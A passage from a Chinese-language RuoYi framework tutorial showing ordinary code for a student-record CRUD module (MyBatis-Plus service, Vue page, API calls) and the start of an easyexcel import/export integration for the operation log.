<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>core<span class="token punctuation">.</span>conditions<span class="token punctuation">.</span>query<span class="token punctuation">.</span></span><span class="token class-name">QueryWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>core<span class="token punctuation">.</span>toolkit<span class="token punctuation">.</span></span><span class="token class-name">Wrappers</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ServiceImpl</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">SysStudent</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">SysStudentMapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ISysStudentService</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 学生信息Service业务层处理
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Service</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysStudentServiceImpl</span> <span class="token keyword">extends</span> <span class="token class-name">ServiceImpl</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudentMapper</span><span class="token punctuation">,</span> <span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">implements</span> <span class="token class-name">ISysStudentService</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> <span class="token function">queryList</span><span class="token punctuation">(</span><span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// 注意：mybatis-plus lambda 模式不支持 eclipse 的编译器</span>
        <span class="token comment">// LambdaQueryWrapper&lt;SysStudent&gt; queryWrapper = Wrappers.lambdaQuery();</span>
        <span class="token comment">// queryWrapper.eq(SysStudent::getStudentName, sysStudent.getStudentName());</span>
        <span class="token class-name">QueryWrapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> queryWrapper <span class="token operator">=</span> <span class="token class-name">Wrappers</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">.</span><span class="token function">getStudentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            queryWrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"student_name"</span><span class="token punctuation">,</span> sysStudent<span class="token punctuation">.</span><span class="token function">getStudentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">.</span><span class="token function">getStudentAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            queryWrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"student_age"</span><span class="token punctuation">,</span> sysStudent<span class="token punctuation">.</span><span class="token function">getStudentAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">.</span><span class="token function">getStudentHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            queryWrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"student_hobby"</span><span class="token punctuation">,</span> sysStudent<span class="token punctuation">.</span><span class="token function">getStudentHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span>queryWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>新增 <strong>ruoyi-ui\src\views\system\student\index.vue</strong></p>
<pre><code class="prism language-vue">&lt;template&gt;
  &lt;div class="app-container"&gt;
    &lt;el-form :model="queryParams" ref="queryForm" :inline="true" v-show="showSearch" label-width="68px"&gt;
      &lt;el-form-item label="学生名称" prop="studentName"&gt;
        &lt;el-input
          v-model="queryParams.studentName"
          placeholder="请输入学生名称"
          clearable
          size="small"
          @keyup.enter.native="handleQuery"
        /&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label="年龄" prop="studentAge"&gt;
        &lt;el-input
          v-model="queryParams.studentAge"
          placeholder="请输入年龄"
          clearable
          size="small"
          @keyup.enter.native="handleQuery"
        /&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label="爱好" prop="studentHobby"&gt;
        &lt;el-input
          v-model="queryParams.studentHobby"
          placeholder="请输入爱好"
          clearable
          size="small"
          @keyup.enter.native="handleQuery"
        /&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label="性别" prop="studentSex"&gt;
        &lt;el-select v-model="queryParams.studentSex" placeholder="请选择性别" clearable size="small"&gt;
          &lt;el-option label="请选择字典生成" value="" /&gt;
        &lt;/el-select&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label="状态" prop="studentStatus"&gt;
        &lt;el-select v-model="queryParams.studentStatus" placeholder="请选择状态" clearable size="small"&gt;
          &lt;el-option label="请选择字典生成" value="" /&gt;
        &lt;/el-select&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label="生日" prop="studentBirthday"&gt;
        &lt;el-date-picker clearable size="small"
          v-model="queryParams.studentBirthday"
          type="date"
          value-format="yyyy-MM-dd"
          placeholder="选择生日"&gt;
        &lt;/el-date-picker&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item&gt;
        &lt;el-button type="primary" icon="el-icon-search" size="mini" @click="handleQuery"&gt;搜索&lt;/el-button&gt;
        &lt;el-button icon="el-icon-refresh" size="mini" @click="resetQuery"&gt;重置&lt;/el-button&gt;
      &lt;/el-form-item&gt;
    &lt;/el-form&gt;

    &lt;el-row :gutter="10" class="mb8"&gt;
      &lt;el-col :span="1.5"&gt;
        &lt;el-button
          type="primary"
          plain
          icon="el-icon-plus"
          size="mini"
          @click="handleAdd"
          v-hasPermi="['system:student:add']"
        &gt;新增&lt;/el-button&gt;
      &lt;/el-col&gt;
      &lt;el-col :span="1.5"&gt;
        &lt;el-button
          type="success"
          plain
          icon="el-icon-edit"
          size="mini"
          :disabled="single"
          @click="handleUpdate"
          v-hasPermi="['system:student:edit']"
        &gt;修改&lt;/el-button&gt;
      &lt;/el-col&gt;
      &lt;el-col :span="1.5"&gt;
        &lt;el-button
          type="danger"
          plain
          icon="el-icon-delete"
          size="mini"
          :disabled="multiple"
          @click="handleDelete"
          v-hasPermi="['system:student:remove']"
        &gt;删除&lt;/el-button&gt;
      &lt;/el-col&gt;
      &lt;el-col :span="1.5"&gt;
        &lt;el-button
          type="warning"
          plain
          icon="el-icon-download"
          size="mini"
          @click="handleExport"
          v-hasPermi="['system:student:export']"
        &gt;导出&lt;/el-button&gt;
      &lt;/el-col&gt;
      &lt;right-toolbar :showSearch.sync="showSearch" @queryTable="getList"&gt;&lt;/right-toolbar&gt;
    &lt;/el-row&gt;

    &lt;el-table v-loading="loading" :data="studentList" @selection-change="handleSelectionChange"&gt;
      &lt;el-table-column type="selection" width="55" align="center" /&gt;
      &lt;el-table-column label="编号" align="center" prop="studentId" /&gt;
      &lt;el-table-column label="学生名称" align="center" prop="studentName" /&gt;
      &lt;el-table-column label="年龄" align="center" prop="studentAge" /&gt;
      &lt;el-table-column label="爱好" align="center" prop="studentHobby" /&gt;
      &lt;el-table-column label="性别" align="center" prop="studentSex" /&gt;
      &lt;el-table-column label="状态" align="center" prop="studentStatus" /&gt;
      &lt;el-table-column label="生日" align="center" prop="studentBirthday" width="180"&gt;
        &lt;template slot-scope="scope"&gt;
          &lt;span&gt;{<!-- -->{ parseTime(scope.row.studentBirthday, '{y}-{m}-{d}') }}&lt;/span&gt;
        &lt;/template&gt;
      &lt;/el-table-column&gt;
      &lt;el-table-column label="操作" align="center" class-name="small-padding fixed-width"&gt;
        &lt;template slot-scope="scope"&gt;
          &lt;el-button
            size="mini"
            type="text"
            icon="el-icon-edit"
            @click="handleUpdate(scope.row)"
            v-hasPermi="['system:student:edit']"
          &gt;修改&lt;/el-button&gt;
          &lt;el-button
            size="mini"
            type="text"
            icon="el-icon-delete"
            @click="handleDelete(scope.row)"
            v-hasPermi="['system:student:remove']"
          &gt;删除&lt;/el-button&gt;
        &lt;/template&gt;
      &lt;/el-table-column&gt;
    &lt;/el-table&gt;
    
    &lt;pagination
      v-show="total&gt;0"
      :total="total"
      :page.sync="queryParams.pageNum"
      :limit.sync="queryParams.pageSize"
      @pagination="getList"
    /&gt;

    &lt;!-- 添加或修改学生信息对话框 --&gt;
    &lt;el-dialog :title="title" :visible.sync="open" width="500px" append-to-body&gt;
      &lt;el-form ref="form" :model="form" :rules="rules" label-width="80px"&gt;
        &lt;el-form-item label="学生名称" prop="studentName"&gt;
          &lt;el-input v-model="form.studentName" placeholder="请输入学生名称" /&gt;
        &lt;/el-form-item&gt;
        &lt;el-form-item label="年龄" prop="studentAge"&gt;
          &lt;el-input v-model="form.studentAge" placeholder="请输入年龄" /&gt;
        &lt;/el-form-item&gt;
        &lt;el-form-item label="爱好" prop="studentHobby"&gt;
          &lt;el-input v-model="form.studentHobby" placeholder="请输入爱好" /&gt;
        &lt;/el-form-item&gt;
        &lt;el-form-item label="性别" prop="studentSex"&gt;
          &lt;el-select v-model="form.studentSex" placeholder="请选择性别"&gt;
            &lt;el-option label="请选择字典生成" value="" /&gt;
          &lt;/el-select&gt;
        &lt;/el-form-item&gt;
        &lt;el-form-item label="状态"&gt;
          &lt;el-radio-group v-model="form.studentStatus"&gt;
            &lt;el-radio label="1"&gt;请选择字典生成&lt;/el-radio&gt;
          &lt;/el-radio-group&gt;
        &lt;/el-form-item&gt;
        &lt;el-form-item label="生日" prop="studentBirthday"&gt;
          &lt;el-date-picker clearable size="small"
            v-model="form.studentBirthday"
            type="date"
            value-format="yyyy-MM-dd"
            placeholder="选择生日"&gt;
          &lt;/el-date-picker&gt;
        &lt;/el-form-item&gt;
      &lt;/el-form&gt;
      &lt;div slot="footer" class="dialog-footer"&gt;
        &lt;el-button type="primary" @click="submitForm"&gt;确 定&lt;/el-button&gt;
        &lt;el-button @click="cancel"&gt;取 消&lt;/el-button&gt;
      &lt;/div&gt;
    &lt;/el-dialog&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import { listStudent, getStudent, delStudent, addStudent, updateStudent, exportStudent } from "@/api/system/student";

export default {
  name: "Student",
  components: {
  },
  data() {
    return {
      // 遮罩层
      loading: true,
      // 选中数组
      ids: [],
      // 非单个禁用
      single: true,
      // 非多个禁用
      multiple: true,
      // 显示搜索条件
      showSearch: true,
      // 总条数
      total: 0,
      // 学生信息表格数据
      studentList: [],
      // 弹出层标题
      title: "",
      // 是否显示弹出层
      open: false,
      // 查询参数
      queryParams: {
        pageNum: 1,
        pageSize: 10,
        studentName: null,
        studentAge: null,
        studentHobby: null,
        studentSex: null,
        studentStatus: null,
        studentBirthday: null
      },
      // 表单参数
      form: {},
      // 表单校验
      rules: {
      }
    };
  },
  created() {
    this.getList();
  },
  methods: {
    /** 查询学生信息列表 */
    getList() {
      this.loading = true;
      listStudent(this.queryParams).then(response =&gt; {
        this.studentList = response.rows;
        this.total = response.total;
        this.loading = false;
      });
    },
    // 取消按钮
    cancel() {
      this.open = false;
      this.reset();
    },
    // 表单重置
    reset() {
      this.form = {
        studentId: null,
        studentName: null,
        studentAge: null,
        studentHobby: null,
        studentSex: null,
        studentStatus: "0",
        studentBirthday: null
      };
      this.resetForm("form");
    },
    /** 搜索按钮操作 */
    handleQuery() {
      this.queryParams.pageNum = 1;
      this.getList();
    },
    /** 重置按钮操作 */
    resetQuery() {
      this.resetForm("queryForm");
      this.handleQuery();
    },
    // 多选框选中数据
    handleSelectionChange(selection) {
      this.ids = selection.map(item =&gt; item.studentId)
      this.single = selection.length!==1
      this.multiple = !selection.length
    },
    /** 新增按钮操作 */
    handleAdd() {
      this.reset();
      this.open = true;
      this.title = "添加学生信息";
    },
    /** 修改按钮操作 */
    handleUpdate(row) {
      this.reset();
      const studentId = row.studentId || this.ids
      getStudent(studentId).then(response =&gt; {
        this.form = response.data;
        this.open = true;
        this.title = "修改学生信息";
      });
    },
    /** 提交按钮 */
    submitForm() {
      this.$refs["form"].validate(valid =&gt; {
        if (valid) {
          if (this.form.studentId != null) {
            updateStudent(this.form).then(response =&gt; {
              this.msgSuccess("修改成功");
              this.open = false;
              this.getList();
            });
          } else {
            addStudent(this.form).then(response =&gt; {
              this.msgSuccess("新增成功");
              this.open = false;
              this.getList();
            });
          }
        }
      });
    },
    /** 删除按钮操作 */
    handleDelete(row) {
      const studentIds = row.studentId || this.ids;
      this.$confirm('是否确认删除学生信息编号为"' + studentIds + '"的数据项?', "警告", {
          confirmButtonText: "确定",
          cancelButtonText: "取消",
          type: "warning"
        }).then(function() {
          return delStudent(studentIds);
        }).then(() =&gt; {
          this.getList();
          this.msgSuccess("删除成功");
        })
    },
    /** 导出按钮操作 */
    handleExport() {
      const queryParams = this.queryParams;
      this.$confirm('是否确认导出所有学生信息数据项?', "警告", {
          confirmButtonText: "确定",
          cancelButtonText: "取消",
          type: "warning"
        }).then(function() {
          return exportStudent(queryParams);
        }).then(response =&gt; {
          this.download(response.msg);
        })
    }
  }
};
&lt;/script&gt;
</code></pre>
<p>新增 <strong>ruoyi-ui\src\api\system\student.js</strong></p>
<pre><code class="prism language-js"><span class="token keyword">import</span> request <span class="token keyword">from</span> <span class="token string">'@/utils/request'</span>

<span class="token comment">// 查询学生信息列表</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">listStudent</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student/list'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
    params<span class="token operator">:</span> query
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 查询学生信息详细</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getStudent</span><span class="token punctuation">(</span><span class="token parameter">studentId</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student/'</span> <span class="token operator">+</span> studentId<span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 新增学生信息</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">addStudent</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
    data<span class="token operator">:</span> data
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 修改学生信息</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">updateStudent</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'put'</span><span class="token punctuation">,</span>
    data<span class="token operator">:</span> data
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 删除学生信息</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">delStudent</span><span class="token punctuation">(</span><span class="token parameter">studentId</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student/'</span> <span class="token operator">+</span> studentId<span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'delete'</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 导出学生信息</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">exportStudent</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/student/export'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
    params<span class="token operator">:</span> query
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>6、登录系统测试学生菜单增删改查功能。</p>
<h2><a id="9easyexcelexcel_6452"></a>9、集成easyexcel实现excel表格增强</h2>
<p>如果默认的<code>excel</code>注解已经满足不了你的需求，可以使用<code>excel</code>的增强解决方案<code>easyexcel</code>，它是阿里巴巴开源的一个<code>excel</code>处理框架，使用简单、功能特性多、以节省内存著称。</p>
<p>1、<code>ruoyi-common\pom.xml</code>模块添加整合依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- easyexcel --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>easyexcel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.2.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、<code>ExcelUtil.java</code>新增<code>easyexcel</code>导出导入方法</p>
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span></span><span class="token class-name">EasyExcel</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 对excel表单默认第一个索引名转换成list（EasyExcel）
 * 
 * @param is 输入流
 * @return 转换后集合
 */</span>
<span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">importEasyExcel</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> is<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token class-name">EasyExcel</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">head</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sheet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doReadSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 对list数据源将其里面的数据导入到excel表单（EasyExcel）
 * 
 * @param list 导出数据集合
 * @param sheetName 工作表的名称
 * @return 结果
 */</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">exportEasyExcel</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">,</span> <span class="token class-name">String</span> sheetName<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">String</span> filename <span class="token operator">=</span> <span class="token function">encodingFilename</span><span class="token punctuation">(</span>sheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">EasyExcel</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">getAbsoluteFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sheet</span><span class="token punctuation">(</span>sheetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doWrite</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、模拟测试，以操作日志为例，修改相关类。</p>
<p><strong>SysOperlogController.java</strong>改为<code>exportEasyExcel</code></p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"操作日志"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span>
<span class="token annotation punctuation">@RequiresPermissions</span><span class="token punctuation">(</span><span class="token string">"monitor:operlog:export"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/export"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">SysOperLog</span> operLog<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysOperLog</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> operLogService<span class="token punctuation">.</span><span class="token function">selectOperLogList</span><span class="token punctuation">(</span>operLog<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysOperLog</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysOperLog</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysOperLog</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> util<span class="token punctuation">.</span><span class="token function">exportEasyExcel</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"操作日志"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>SysOperLog.java</strong>修改为<code>@ExcelProperty</code>注解</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">ToStringBuilder</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">ToStringStyle</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExcelIgnoreUnannotated</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExcelProperty</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>format<span class="token punctuation">.</span></span><span class="token class-name">DateTimeFormat</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>write<span class="token punctuation">.</span>style<span class="token punctuation">.</span></span><span class="token class-name">ColumnWidth</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>write<span class="token punctuation">.</span>style<span class="token punctuation">.</span></span><span class="token class-name">HeadFontStyle</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>write<span class="token punctuation">.</span>style<span class="token punctuation">.</span></span><span class="token class-name">HeadRowHeight</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">BaseEntity</span><span class="token punctuation">;</span>
